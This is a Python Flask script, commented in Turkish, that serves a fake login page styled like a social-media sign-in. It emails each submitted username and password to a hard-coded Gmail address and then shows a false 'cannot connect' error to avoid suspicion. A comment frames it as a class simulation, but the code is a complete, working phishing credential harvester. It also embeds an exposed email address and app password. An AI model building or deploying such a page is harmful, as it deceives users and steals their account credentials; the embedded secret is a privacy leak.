from flask import Flask, request, render_template_string
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

# --- AYARLAR ---
# Gmail kullanıyorsan "Uygulama Şifresi" almalısın.
GONDEREN_EMAIL = "sancarmete26@gmail.com"
UYGULAMA_SIFRESI = "vkpt jeoz weje swhw" 
ALICI_EMAIL = "sancarmete26@gmail.com"

# --- HTML ARAYÜZÜ ---
# Hocana sunarken buranın bir "Giriş Paneli" simülasyonu olduğunu belirtirsin.
html_tasarimi = """
<!DOCTYPE html>
<html>
<head>
    <title>Giriş Yap</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; margin-top: 50px; }
        .login-box { border: 1px solid #dbdbdb; padding: 20px; width: 300px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; }
        button { width: 95%; padding: 10px; background-color: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Uygulama Adı</h2>
        <form method="POST" action="/login_islem">
            <input type="text" name="u_name" placeholder="Kullanıcı adı veya e-posta" required>
            <input type="password" name="u_pass" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

# --- E-POSTA GÖNDERME FONKSİYONU ---
def eposta_yolla(user, password):
    msg = EmailMessage()
    msg.set_content(f"Sistemden gelen bilgi:\n\nKullanıcı: {user}\nŞifre: {password}")
    msg['Subject'] = 'Yeni Giriş Bilgisi Yakalandı'
    msg['From'] = GONDEREN_EMAIL
    msg['To'] = ALICI_EMAIL

    try:
        # Gmail için SSL bağlantısı (Port 465)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(GONDEREN_EMAIL, UYGULAMA_SIFRESI)
            smtp.send_message(msg)
        print("Bilgi başarıyla e-postaya gönderildi.")
    except Exception as e:
        print(f"Hata oluştu: {e}")

# --- ROUTER (YÖNLENDİRME) ---
@app.route('/')
def ana_sayfa():
    return render_template_string(html_tasarimi)

@app.route('/login_islem', methods=['POST'])
def login_islem():
    # Form verilerini çekiyoruz
    kullanici = request.form.get('u_name')
    sifre = request.form.get('u_pass')
    
    # E-posta gönderme işlemini başlatıyoruz
    eposta_yolla(kullanici, sifre)
    
    # Kullanıcıya hata mesajı gösteriyoruz (gerçekçilik için)
    return "<h3>Hata: Sunucuya bağlanılamadı. Lütfen internet bağlantınızı kontrol edip tekrar deneyin.</h3>"

if __name__ == "__main__":
    app.run()
